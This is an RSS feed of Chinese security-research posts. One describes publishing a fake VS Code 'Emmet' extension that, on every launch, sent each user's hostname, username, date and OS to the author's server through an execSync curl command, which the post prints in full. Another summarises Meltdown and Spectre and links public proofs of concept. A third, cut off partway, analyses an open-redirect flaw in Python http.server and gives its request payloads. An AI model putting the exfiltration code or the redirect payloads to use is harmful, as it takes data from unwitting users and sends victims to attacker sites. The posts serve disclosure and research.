<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
<channel>
<title>长亭技术专栏</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/</link>
<description></description>
<language>zh-cn</language>
<lastBuildDate>Sun, 11 Feb 2018 23:03:56 +0800</lastBuildDate>
<item>
<title>VSCODE EXTENSION 钓鱼</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-01-23-33203374.htm</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/33203374&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-3f98183e24f6e09f4c4470311dcc1754_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;作者：&lt;/b&gt;&lt;a href=&quot;https://www.zhihu.com/people/D0n9&quot;&gt;栋栋的栋&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;灵感来源于 fate0 这篇 &lt;a href=&quot;http://blog.fatezero.org/2017/06/01/package-fishing/?from=groupmessage&amp;amp;isappinstalled=0&quot;&gt;Package 钓鱼&lt;/a&gt;&lt;/p&gt;&lt;p&gt;随想做一次针对开发者的“钓鱼”实验，编程语言模块库的钓鱼实验fate0和ztz已经做过了，所以这次把实验对象选择编辑器(IDE)&lt;/p&gt;&lt;p&gt;5$买了一台廉价vps用作收集用户数据，收集以下信息。&lt;/p&gt;&lt;p&gt;· hostname&lt;/p&gt;&lt;p&gt;· whoami&lt;/p&gt;&lt;p&gt;· date&lt;/p&gt;&lt;p&gt;· uname&lt;/p&gt;&lt;p&gt;· ip&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;mysql&amp;gt; desc db;
+----------+-----------------+------+-----+---------+----------------+
| Field    | Type            | Null | Key | Default | Extra          |
+----------+-----------------+------+-----+---------+----------------+
| id       | int(4) unsigned | NO   | PRI | NULL    | auto_increment |
| hostname | varchar(32)     | NO   |     | NULL    |                |
| whoami   | varchar(32)     | NO   |     | NULL    |                |
| date     | varchar(32)     | NO   |     | NULL    |                |
| uname    | varchar(32)     | NO   |     | NULL    |                |
| ide      | varchar(32)     | NO   |     | NULL    |                |
| ip       | varchar(32)     | NO   |     | NULL    |                |
+----------+-----------------+------+-----+---------+----------------+&lt;/code&gt;&lt;p&gt;获取ip方式使用$_SERVER[“REMOTE_ADDR”]; 所以可能会不准确。&lt;/p&gt;&lt;p&gt;好了，回到主题&lt;/p&gt;&lt;p&gt;选择制作Visual Studio Code的“恶意”插件，需要用到的工具是 Yeoman 和 vsce&lt;/p&gt;&lt;blockquote&gt;&lt;i&gt;npm install -g yo generator-code&lt;br&gt;npm install -g vsce&lt;/i&gt;&lt;/blockquote&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f1818729f547600a35585b5d658ebbb6_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;999&quot; data-rawheight=&quot;608&quot;&gt;&lt;p&gt;选择TypeScript语言作为插件的代码语言，可以导入Node.js进程通信模块&lt;b&gt;import { execSync } from ‘child_process’;&lt;/b&gt;，就可以使用exec() execSync() 执行命令&lt;/p&gt;&lt;p&gt;./test/src/extension.ts&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;execSync(&#39;curl &quot;http://45.32.40.141/&quot; --user-agent &quot;$(echo `hostname`, `whoami`, `date &quot;+%Y-%m-%d %H:%M:%S&quot;`, `uname`, vscode | base64)&quot;&#39;)&lt;/code&gt;&lt;p&gt;执行curl命令外带出数据，有个不足没有考虑Windows系统，这也是导致了最后插件安装量很大但是实际有效数据不多的原因。&lt;/p&gt;&lt;p&gt;考虑再三还是把命令硬编码在代码里，因为只是一次实验，如果下发脚本的方式就会被当作真的是恶意程序&lt;/p&gt;&lt;p&gt;还有一个知识点，vscode启动默认是不加载插件的，这是因为官方考虑到加载插件会拖慢启动速度，只有设置触发条件才会启动&lt;/p&gt;&lt;p&gt;./test/src/package.json&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&quot;activationEvents&quot;: [
    &quot;onCommand:extension.sayHello&quot;
],&lt;/code&gt;&lt;p&gt;改为&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&quot;activationEvents&quot;: [
    &quot;*&quot;,
    &quot;onCommand:extension.sayHello&quot;
],&lt;/code&gt;&lt;p&gt;星号表示任何情况下都会触发，就这么简单，一个恶意的插件就做好了，当然为了使之更加逼真还要增加一些迷惑性的内容，比如README.md最好图文并茂，再给插件设置一张icon，就可以上传到 &lt;a href=&quot;https://marketplace.visualstudio.com/&quot;&gt;https://marketplace.visualstudio.com&lt;/a&gt; 了，几分钟就审核通过，那肯定是自动审核了&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-8f0de38638fb609bf3735f425e179965_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1208&quot; data-rawheight=&quot;429&quot;&gt;&lt;p&gt;可能是因为Emmet知名度太高（用过sublime的小伙伴肯定知道这个插件）”恶意“插件上架仅两天就有了二十九万的安装量，后来发现竟然还上了首页热门推荐，这是意想不到的，起初还在担心如果不可控了咋办，最后证明这个担心是多余的，XDD&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-6330c09e78724f67db3c0f13db34b574_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1276&quot; data-rawheight=&quot;1026&quot;&gt;&lt;p&gt;当然也不是那么顺利，因为插件并没有实际功能，还是被几位外国人识破举报了，周二一早就被官方下架了，从周六到周二仅持续了三天时间，相信如果是在正常插件中加入恶意代码肯定会潜伏更长更不易被发现。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-968dacc3cca8dc97dde549349fb499b1_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1159&quot; data-rawheight=&quot;667&quot;&gt;&lt;p&gt;但是在下架的时候已经有了367004次的安装量 &lt;a href=&quot;https://marketplace.visualstudio.com/items?itemName=visualstuiocode.emmet#overview&quot;&gt;https://marketplace.visualstudio.com/items?itemName=visualstuiocode.emmet#overview&lt;/a&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0fb4230a609ecb4db8c78fd7f6bbfe41_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1199&quot; data-rawheight=&quot;221&quot;&gt;&lt;p&gt;因为每次启动都会加载插件执行命令，所以上报的数据需要去重，hostname 加 whoami hash 后当作 uid 去重统计操作系统占比，可以看出other数量最多，这部分可能是Windows或是其他原因没有上报数据&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-8b0a1f77ef8df9edb87919641741b58e_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1031&quot; data-rawheight=&quot;907&quot;&gt;&lt;p&gt;中招最多的国家top10，数据验证使用 &lt;a href=&quot;http://ip.taobao.com/service/getIpInfo.php&quot;&gt;http://ip.taobao.com/service/getIpInfo.php&lt;/a&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2fee8d69e9c4468a38c6a993c61e609c_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1624&quot; data-rawheight=&quot;979&quot;&gt;&lt;p&gt;思考，是什么原因导致三天达到三十几万的安装量呢？&lt;/p&gt;&lt;p&gt;这个锅官方是背定了，因为官方审核机制不严格，spam 不及时，甚至还登上了首页热门推荐两天才导致大量安装，后续没有补救措施，对于已经安装了恶意插件的用户没有提示告知，只对插件做了下架处理，原本已经安装的用户还是会受影响。&lt;/p&gt;&lt;p&gt;ide有那么多，sublime 是使用Python写插件，JetBrains家和Eclipse用Java，Notepad++用c++，都可以按照类似思路构造出恶意插件。&lt;/p&gt;&lt;p&gt;未来会不会再出现xcodeghost事件呢？拭目以待。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;ref：&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://zh.wikipedia.org/wiki/XcodeGhost%E9%A3%8E%E6%B3%A2&quot;&gt;https://zh.wikipedia.org/wiki/XcodeGhost%E9%A3%8E%E6%B3%A2&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://imzc.me/tools/2016/10/13/getting-started-with-vscode-ext/&quot;&gt;http://imzc.me/tools/2016/10/13/getting-started-with-vscode-ext/&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://code.visualstudio.com/docs/extensions/overview&quot;&gt;https://code.visualstudio.com/docs/extensions/overview&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://nodejs.cn/api/child_process.html&quot;&gt;http://nodejs.cn/api/child_process.html&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://blog.fatezero.org/2017/06/01/package-fishing/?from=groupmessage&amp;amp;isappinstalled=0&quot;&gt;http://blog.fatezero.org/2017/06/01/package-fishing/?from=groupmessage&amp;amp;isappinstalled=0&lt;/a&gt;&lt;/p&gt;</description>
<author>perhaps</author>
<guid isPermaLink="false">2018-01-23-33203374</guid>
<pubDate>Tue, 23 Jan 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>“幽灵”和“熔断”，究竟是什么？（事件汇总）</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-01-10-32810180.htm</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/32810180&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-666c34510675547bd40b152594170c1a_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;作者：fec&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;最近被「幽灵」和「熔断」刷了屏，虽然已经有各路大牛发布了相关的研究和分析，但依然听到身边有不少疑惑和紧张的声音，于是笔者整理了事件相关的内容汇总，以供大家参考。（仅为整理，欢迎大家讨论。）&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;事件回顾&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;2018 年 1 月 3 日有消息传出说，Intel CPU 存在重大 Bug ，几乎影响所有的英特尔现代的 CPU 。后来经证实，不仅影响 Intel CPU ，其他主流 CPU 也会受到影响。&lt;/p&gt;&lt;p&gt;此次影响的漏洞主要为 2 个：Meltdown（熔断）对应编号恶意数据缓存加载 CVE-2017-5754 ，Spectre （幽灵）对应编号边界检查绕过 CVE-2017-5753 、分支目标注入 CVE-2017-5715 ，Meltdown 影响几乎所有的 Intel CPU（从1995年起）以及部分 ARM CPU 。而 Spectre 拥有更广的影响范围，Intel 、ARM、AMD 都受其影响。在 Meltdown 的情况下，一个恶意程序可以窥探操作系统的内存，并可读取自身无权限访问的数据。利用此漏洞低权限用户可以访问到本身无权限访问的内容，例如用户密码、加密密钥。Spectre 可以归纳为计算机上运行的两个程序可以相互监视，无视自身的安全界限。用户浏览器访问了含有 Spectre 的恶意利用程序，可能导致用户的帐号、密码泄漏。而在公共云服务器上，则可能打破界限，从一台虚拟机器获取到另一个用户的权限。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;漏洞成因简单分析&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这次漏洞利用了 CPU 执行中对出现故障的处理。由于现在 CPU 为了提供性能，引入了乱序执行和预测执行。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;乱序执行是指 CPU 并不是严格按照指令的顺序串行执行，而是根据相关性对指令进行分组并行执行，最后汇总处理各组指令执行的结果。&lt;/li&gt;&lt;li&gt;预测执行是 CPU 根据当前掌握的信息预测某个条件判断的结果，然后选择对应的分支提前执行。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;这两种执行在遇到异常时，CPU 会丢弃之前执行的结果，将 CPU 的状态恢复到乱序执行或预测执行前的正确状态，然后继续执行正确的指令，从而保证了程序能够正确连续的执行。但是问题在于，CPU 恢复状态时并不会清除 CPU 缓存中的内容，而这两组漏洞正是利用了这一设计上的缺陷进行侧信道攻击。&lt;b&gt;乱序执行对应的利用即为 Meltdown ，而预测执行对应的利用即为 Spectre 。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;漏洞验证&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;目前 Github 给出的相应验证 Poc &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/paboldin/meltdown-exploit/&quot;&gt;https://github.com/paboldin/meltdown-exploit/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/Eugnis/spectre-attack&quot;&gt;https://github.com/Eugnis/spectre-attack&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/feruxmax/meltdown&quot;&gt;https://github.com/feruxmax/meltdown&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/gkaindl/meltdown-poc&quot;&gt;https://github.com/gkaindl/meltdown-poc&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/turbo/KPTI-PoC-Collection&quot;&gt;https://github.com/turbo/KPTI-PoC-Collection&lt;/a&gt; &lt;/p&gt;&lt;h2&gt;&lt;b&gt;漏洞影响&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;虽然此次漏洞影响范围较广，并且在 Github 上已有 Poc 流出，但是目前流出的 Poc 并不能直接去系统造成危害。同时由于 CPU 本身的复杂性，&lt;b&gt;暂未发现有能够造成严重危害的通用稳定的 Poc 流出&lt;/b&gt;。同时此次漏洞并不能被单独进行远程利用。&lt;b&gt;此次主要影响的为云服务厂商&lt;/b&gt;，&lt;b&gt;对普通用户的影响主要为浏览器方面&lt;/b&gt;。养成良好的上网习惯，不点开陌生人发送的连接，同时将浏览器更新为最新版本基本不会收到此次漏洞的影响。此外，目前暂未发现野生的针对该漏洞进行的攻击。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;修复建议&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;具体修复可参照下列各厂商安全公告相关安全公告&lt;/p&gt;&lt;p&gt;&lt;b&gt;CPU 厂商&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Intel&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://security-center.intel.com/advisory.aspx?intelid=INTEL-SA-00088&amp;amp;languageid=en-fr&quot;&gt;https://security-center.intel.com/advisory.aspx?intelid=INTEL-SA-00088&amp;amp;amp;languageid=en-fr&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://newsroom.intel.com/news/intel-responds-to-security-research-findings/&quot;&gt;https://newsroom.intel.com/news/intel-responds-to-security-research-findings/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://newsroom.intel.com/news-releases/intel-issues-updates-protect-systems-security-exploits/&quot;&gt;https://newsroom.intel.com/news-releases/intel-issues-updates-protect-systems-security-exploits/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://www.intel.com/content/www/us/en/architecture-and-technology/facts-about-side-channel-analysis-and-intel-products.html&quot;&gt;https://www.intel.com/content/www/us/en/architecture-and-technology/facts-about-side-channel-analysis-and-intel-products.html&lt;/a&gt;&lt;/p&gt;&lt;p&gt;ARM&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://developer.arm.com/support/security-update/download-the-whitepaper&quot;&gt;https://developer.arm.com/support/security-update/download-the-whitepaper&lt;/a&gt;&lt;a href=&quot;https://developer.arm.com/support/security-update&quot;&gt;https://developer.arm.com/support/security-update&lt;/a&gt;&lt;/p&gt;&lt;p&gt;AMD&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://www.amd.com/en/corporate/speculative-execution&quot;&gt;https://www.amd.com/en/corporate/speculative-execution&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;操作系统&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Microsoft微软&lt;/p&gt;&lt;ul&gt;&lt;li&gt;普通用户：&lt;a href=&quot;https://support.microsoft.com/help/4073119&quot;&gt;https://support.microsoft.com/help/4073119&lt;/a&gt;&lt;/li&gt;&lt;li&gt;服务器用户：&lt;a href=&quot;https://support.microsoft.com/help/4072698&quot;&gt;https://support.microsoft.com/help/4072698&lt;/a&gt;&lt;/li&gt;&lt;li&gt;云用户：&lt;a href=&quot;https://support.microsoft.com/help/4073235&quot;&gt;https://support.microsoft.com/help/4073235&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Red Hat&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://access.redhat.com/security/vulnerabilities/speculativeexecution&quot;&gt;https://access.redhat.com/security/vulnerabilities/speculativeexecution&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Linux&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://lkml.org/lkml/2017/12/4/709&quot;&gt;https://lkml.org/lkml/2017/12/4/709&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Android&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://source.android.com/security/bulletin/2018-01-01&quot;&gt;https://source.android.com/security/bulletin/2018-01-01&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Apple&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://support.apple.com/en-us/HT208394&quot;&gt;https://support.apple.com/en-us/HT208394&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;其他厂商&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Amazon&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://aws.amazon.com/de/security/security-bulletins/AWS-2018-013/&quot;&gt;https://aws.amazon.com/de/security/security-bulletins/AWS-2018-013/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Google&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.co.at/2018/01/reading-privileged-memory-with-side.html&quot;&gt;https://googleprojectzero.blogspot.co.at/2018/01/reading-privileged-memory-with-side.html&lt;/a&gt;&lt;a href=&quot;https://www.chromium.org/Home/chromium-security/ssca&quot;&gt;https://www.chromium.org/Home/chromium-security/ssca&lt;/a&gt;&lt;/p&gt;&lt;p&gt;MITRE&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5715&quot;&gt;http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5715&lt;/a&gt;&lt;a href=&quot;http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5753&quot;&gt;http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5753&lt;/a&gt;&lt;a href=&quot;http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5754&quot;&gt;http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5754&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Xen&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://xenbits.xen.org/xsa/advisory-254.html&quot;&gt;http://xenbits.xen.org/xsa/advisory-254.html&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Mozilla&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://blog.mozilla.org/security/2018/01/03/mitigations-landing-new-class-timing-attack/&quot;&gt;https://blog.mozilla.org/security/2018/01/03/mitigations-landing-new-class-timing-attack/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;VMware&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://www.vmware.com/us/security/advisories/VMSA-2018-0002.html&quot;&gt;https://www.vmware.com/us/security/advisories/VMSA-2018-0002.html&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;参考连接&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.rapid7.com/2018/01/04/meltdown-and-spectre-what-you-need-to-know-cve-2017-5715-cve-2017-5753-cve-2017-5754/&quot;&gt;https://blog.rapid7.com/2018/01/04/meltdown-and-spectre-what-you-need-to-know-cve-2017-5715-cve-2017-5753-cve-2017-5754/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://www.tomshardware.com/news/meltdown-spectre-exploits-intel-amd-arm-nvidia,36219.html&quot;&gt;Understanding The Meltdown And Spectre Exploits: Intel, AMD, ARM, And Nvidia&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://meltdownattack.com/meltdown.pdf&quot;&gt;https://meltdownattack.com/meltdown.pdf&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>perhaps</author>
<guid isPermaLink="false">2018-01-10-32810180</guid>
<pubDate>Wed, 10 Jan 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>Python http.server 任意跳转漏洞浅析</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-01-03-32592960.htm</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/32592960&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-5cc0dbfc9fb023180000c2db6facb0c7_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;作者：Phith0n&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Github账号被封了以后，Vulhub也无法继续更新了，余下很多时间，默默看了点代码，偶然还能遇上一两个漏洞，甚是有趣。&lt;/p&gt;&lt;p&gt;这个漏洞出现在python核心库http中，发送给官方团队后被告知撞洞了，&lt;b&gt;且官方也认为需要更多人看看怎么修复这个问题&lt;/b&gt;，所以我们来分析一下。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x01  http.server库简单分析&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;众所周知Python有一个一键启动Web服务器的方法：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;python3 -m http.server&lt;/code&gt;&lt;p&gt;在任意目录执行如上命令，即可启动一个web文件服务器。其实这个方法就用到了http.server模块。这个模块包含几个比较重要的类：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;HTTPServer这个类继承于socketserver.TCPServer，说明其实HTTP服务器本质是一个TCP服务器&lt;/li&gt;&lt;li&gt;BaseHTTPRequestHandler，这是一个处理TCP协议内容的Handler，目的就是将从TCP流中获取的数据按照HTTP协议进行解析，并按照HTTP协议返回相应数据包。但这个类解析数据包后没有进行任何操作，不能直接使用。如果我们要写自己的Web应用，应该继承这个类，并实现其中的do_XXX等方法。&lt;/li&gt;&lt;li&gt;SimpleHTTPRequestHandler，这个类继承于BaseHTTPRequestHandler，从父类中拿到解析好的数据包，并将用户请求的path返回给用户，等于实现了一个静态文件服务器。&lt;/li&gt;&lt;li&gt;CGIHTTPRequestHandler，这个类继承于SimpleHTTPRequestHandler，在静态文件服务器的基础上，增加了执行CGI脚本的功能。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;简单来说就是如下：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;+-----------+          +------------------------+    
| TCPServer |          | BaseHTTPRequestHandler |
+-----------+          +------------------------+ 
     ^                            |
     |                            v
     |                +--------------------------+
     +----------------| SimpleHTTPRequestHandler |
     |                +--------------------------+
     |                            |
     |                            v
     |                 +-----------------------+
     +-----------------| CGIHTTPRequestHandler |
                       +-----------------------+&lt;/code&gt;&lt;p&gt;我们看看&lt;code class=&quot;inline&quot;&gt;SimpleHTTPRequestHandler&lt;/code&gt;的源代码：&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    server_version = &quot;SimpleHTTP/&quot; + __version__

    def do_GET(self):
        &quot;&quot;&quot;Serve a GET request.&quot;&quot;&quot;
        f = self.send_head()
        if f:
            try:
                self.copyfile(f, self.wfile)
            finally:
                f.close()

    # ...

    def send_head(self):
        path = self.translate_path(self.path)
        f = None
        if os.path.isdir(path):
            parts = urllib.parse.urlsplit(self.path)
            if not parts.path.endswith(&#39;/&#39;):
                # redirect browser - doing basically what apache does
                self.send_response(HTTPStatus.MOVED_PERMANENTLY)
                new_parts = (parts[0], parts[1], parts[2] + &#39;/&#39;,
                             parts[3], parts[4])
                new_url = urllib.parse.urlunsplit(new_parts)
                self.send_header(&quot;Location&quot;, new_url)
                self.end_headers()
                return None
            for index in &quot;index.html&quot;, &quot;index.htm&quot;:
                index = os.path.join(path, index)
                if os.path.exists(index):
                    path = index
                    break
            else:
                return self.list_directory(path)
        # ...&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;前面HTTP解析的部分不再分析，如果我们请求的是GET方法，将会被分配到&lt;code class=&quot;inline&quot;&gt;do_GET&lt;/code&gt;函数里，在&lt;code class=&quot;inline&quot;&gt;do_GET()&lt;/code&gt;中调用了&lt;code class=&quot;inline&quot;&gt;send_head()&lt;/code&gt;方法。&lt;/p&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;send_head()&lt;/code&gt;中调用了&lt;code class=&quot;inline&quot;&gt;self.translate_path(self.path)&lt;/code&gt;将request path进行一个标准化操作，目的是获取用户真正请求的文件。如果这个path是一个已存在的目录，则进入if语句。&lt;/p&gt;&lt;p&gt;如果用户请求的path不是以&lt;code class=&quot;inline&quot;&gt;/&lt;/code&gt;结尾，则进入第二个if语句，这个语句中执行了HTTP跳转的操作，这就是我们当前漏洞的关键点了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x02  任意URL跳转漏洞&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;如果我们请求的是一个已存在的目录，但PATH没有以&lt;code class=&quot;inline&quot;&gt;/&lt;/code&gt;结尾，则将PATH增加&lt;code class=&quot;inline&quot;&gt;/&lt;/code&gt;并用301跳转。&lt;/p&gt;&lt;p&gt;这就涉及到了一个有趣的问题：在chrome、firefox等主流浏览器中，如果url以&lt;code class=&quot;inline&quot;&gt;//domain&lt;/code&gt;开头，浏览器将会默认认为这个url是当前数据包的协议。比如，我们访问&lt;code class=&quot;inline&quot;&gt;http://example.com&lt;/code&gt;，跳转到&lt;code class=&quot;inline&quot;&gt;//baidu.com/&lt;/code&gt;，则浏览器会默认认为跳转到&lt;code class=&quot;inline&quot;&gt;http://baidu.com&lt;/code&gt;，而不是跳转到&lt;code class=&quot;inline&quot;&gt;.//baidu.com/目录&lt;/code&gt;&lt;a href=&quot;//baidu.com/%E7%9B%AE%E5%BD%95%E3%80%82&quot;&gt;。&lt;/a&gt;&lt;/p&gt;&lt;p&gt;所以，如果我们发送的请求的是&lt;code class=&quot;inline&quot;&gt;GET //baidu.com HTTP/1.0\r\n\r\n&lt;/code&gt;，那么将会被重定向到&lt;code class=&quot;inline&quot;&gt;//baidu.com/&lt;/code&gt;，也就产生了一个任意URL跳转漏洞。&lt;/p&gt;&lt;p&gt;在此前，由于目录&lt;code class=&quot;inline&quot;&gt;baidu.com&lt;/code&gt;不存在，我们还需要绕过&lt;code class=&quot;inline&quot;&gt;if os.path.isdir(path)&lt;/code&gt;这条if语句。绕过方法也很简单，因为&lt;code class=&quot;inline&quot;&gt;baidu.com&lt;/code&gt;不存在，我们跳转到上一层目录即可：&lt;/p&gt;&lt;code lang=&quot;html&quot;&gt;GET //baidu.com/%2f.. HTTP/1.0\r\n\r\n&lt;/code&gt;&lt;p&gt;如何测试这个漏洞呢？其实也很简单，直接用&lt;code class=&quot;inline&quot;&gt;python3 -m http.server&lt;/code&gt;启动一个HTTP服务器即可。访问&lt;code class=&quot;inline&quot;&gt;http://127.0.0.1:8000//example.com/%2f%2e%2e&lt;/code&gt;即可发现跳转到了&lt;code class=&quot;inline&quot;&gt;http://example.com/%2f../&lt;/code&gt;。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-55826f561cc369457771b1d24cef42fa_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1207&quot; data-rawheight=&quot;489&quot;&gt;&lt;h2&gt;&lt;b&gt;0x03  web.py任意URL跳转漏洞&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;那么，虽然说python核心库存在这个漏洞，不过通常情况下不会有人直接在生产环境用&lt;code class=&quot;inline&quot;&gt;python -m http.server&lt;/code&gt;。&lt;/p&gt;&lt;p&gt;Python框架web.py在处理静态文件的代码中继承并使用了&lt;code class=&quot;inline&quot;&gt;SimpleHTTPRequestHandler&lt;/code&gt;类，所以也会受到影响。&lt;/p&gt;&lt;p&gt;我们可以简单测试一下，我们用web.py官网的示例代码创建一个web应用：&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;import web

urls = (
    &#39;/(.*)&#39;, &#39;hello&#39;
